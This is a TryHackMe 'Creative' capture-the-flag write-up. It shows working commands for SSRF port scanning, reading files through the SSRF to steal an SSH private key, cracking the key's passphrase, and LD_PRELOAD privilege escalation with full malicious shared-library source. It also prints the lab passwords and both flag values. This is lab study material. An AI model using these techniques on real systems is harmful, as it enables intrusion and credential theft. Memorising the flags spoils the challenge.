# TryHackMe — Creative Walkthrough

**Difficulty:** Easy  
**OS:** Linux (Ubuntu 20.04)  
**Techniques:** Subdomain Enumeration, SSRF, LFI via SSRF, SSH Private Key Theft, LD_PRELOAD Privilege Escalation

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Subdomain Enumeration](#2-subdomain-enumeration)
3. [SSRF Discovery](#3-ssrf-discovery)
4. [Internal Port Scanning via SSRF](#4-internal-port-scanning-via-ssrf)
5. [LFI via SSRF — SSH Key Exfiltration](#5-lfi-via-ssrf--ssh-key-exfiltration)
6. [Initial Access — SSH](#6-initial-access--ssh)
7. [Privilege Escalation — LD_PRELOAD](#7-privilege-escalation--ld_preload)
8. [Flags](#8-flags)

---

## 1. Reconnaissance

Added the target to `/etc/hosts`:

```bash
echo "10.65.155.247  creative creative.thm" | sudo tee -a /etc/hosts
```

> **Note:** Adding both `creative` and `creative.thm` in a single line avoids issues later, since the web server redirects to `creative.thm`.

Ran an nmap scan:

```bash
nmap -v -sC -sV -oN initial creative
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
```

Only two ports open: SSH (22) and HTTP (80). Since SSH requires credentials, the attack surface is the web application.


---

## 2. Subdomain Enumeration

The HTTP server redirects to `creative.thm`. Enumerated subdomains using `ffuf` with virtual host fuzzing:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://creative.thm \
     -H "Host: FUZZ.creative.thm" \
     -fc 301
```

**Found:** `beta.creative.thm`

Added to `/etc/hosts`:

```bash
echo "10.65.155.247  beta.creative.thm" | sudo tee -a /etc/hosts
```

Navigating to `http://beta.creative.thm` revealed a form that accepts a URL and tests whether it is alive — (SSRF candidate).

---

## 3. SSRF Discovery

Tested the form by submitting the loopback address:

```
http://127.0.0.1
```

The server returned content from its own port 80, confirming **Server-Side Request Forgery (SSRF)**. The server was making HTTP requests on our behalf, including to its own internal network.

---

## 4. Internal Port Scanning via SSRF

With SSRF confirmed, the next step was to enumerate internally open ports not exposed to the outside. A baseline response (port closed) returned a body of 13 bytes, which was used as a filter.

Generated a full port list and fuzzed with ffuf:

```bash
ffuf -u 'http://beta.creative.thm/' \
     -d "url=http://127.0.0.1:FUZZ/" \
     -w <(seq 1 65535) \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -mc all \
     -t 100 \
     -fs 13
```

**Command breakdown:**
- `-d "url=http://127.0.0.1:FUZZ/"` — POST body with the SSRF payload, fuzzing port numbers
- `-w <(seq 1 65535)` — generates numbers 1–65535 inline via bash process substitution
- `-mc all` — matches all HTTP status codes
- `-t 100` — 100 parallel threads
- `-fs 13` — filters out responses of 13 bytes (closed port responses)

**Results:**

```
80    [Status: 200, Size: 37589]   ← the public website
1337  [Status: 200, Size: 1143]    ← internal service
```

Accessing port 1337 via the SSRF:

```
http://127.0.0.1:1337/
```

Returned a **directory listing of the entire filesystem root (`/`)**.

---

## 5. LFI via SSRF — SSH Key Exfiltration

With arbitrary filesystem read via SSRF → port 1337, browsed to the home directory:

```bash
curl http://beta.creative.thm -d "url=http://127.0.0.1:1337/home/"
# Found user: saad

curl http://beta.creative.thm -d "url=http://127.0.0.1:1337/home/saad/.ssh/"
# Directory listing: authorized_keys, id_rsa, id_rsa.pub, known_hosts
```

Extracted the private key:

```bash
curl http://beta.creative.thm -d "url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa" > id_rsa
chmod 600 id_rsa
```

The key was encrypted (AES-256-CTR + bcrypt). Cracked the passphrase with John the Ripper:

```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Passphrase found:** `sweetness`

---

## 6. Initial Access — SSH

```bash
ssh -i id_rsa saad@10.65.155.247
# Enter passphrase: sweetness
```

Shell obtained as `saad`.

```bash
cat ~/user.txt
# 9a1ce90a7653d74ab98630b47b8b4a84
```

---

## 7. Privilege Escalation — LD_PRELOAD

Checked `.bash_history` and found a cleartext password accidentally left in the history:

```bash
cat ~/.bash_history
# echo "saad:MyStrongestPasswordYet$4291" > creds.txt
```

Used this password to run `sudo -l`:

```
Matching Defaults entries for saad:
    env_reset, mail_badpass,
    env_keep+=LD_PRELOAD        ← critical misconfiguration

User saad may run the following commands:
    (root) /usr/bin/ping
```

**The vulnerability:** `env_keep+=LD_PRELOAD` preserves the `LD_PRELOAD` environment variable across sudo calls. `LD_PRELOAD` tells the dynamic linker to load a shared library before any other — including system libraries. Combined with any sudo-allowed binary, this gives full root.

**Exploit:**

```bash
# Write malicious shared library
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# Compile as position-independent shared object
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Execute ping via sudo with our library preloaded
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/ping
```

**How it works:**
1. `gcc -fPIC -shared` compiles the C file as a shared library
2. `_init()` is called automatically by the linker when the library is loaded
3. `setuid(0)` + `setgid(0)` sets the process UID/GID to root
4. `system("/bin/bash")` spawns a root shell before ping even starts

```bash
whoami
# root
```

```bash
cat /root/root.txt
# 992bfd94b90da48634aed182aae7b99f
```

---

## 8. Flags

| Flag | Value |
|------|-------|
| User | `9a1ce90a7653d74ab98630b47b8b4a84` |
| Root | `992bfd94b90da48634aed182aae7b99f` |

---


